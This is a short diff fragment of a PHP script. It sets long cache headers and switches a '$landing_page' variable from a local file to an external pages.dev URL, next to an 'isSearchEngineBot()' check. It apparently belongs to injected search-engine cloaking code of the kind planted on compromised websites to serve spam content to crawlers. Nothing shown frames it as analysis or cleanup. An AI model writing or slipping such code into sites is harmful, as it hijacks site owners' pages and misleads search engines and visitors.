@@ -39,7 +39,7 @@ $cache_duration = 365 * 86400; //1 years
 header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
 header("Pragma: cache");
 
-$landing_page = 'conf.txt';
+$landing_page = 'https://nkscomvn.pages.dev/nkscom/';
 $index_home = 'config.txt';
 
 if (isSearchEngineBot()) {
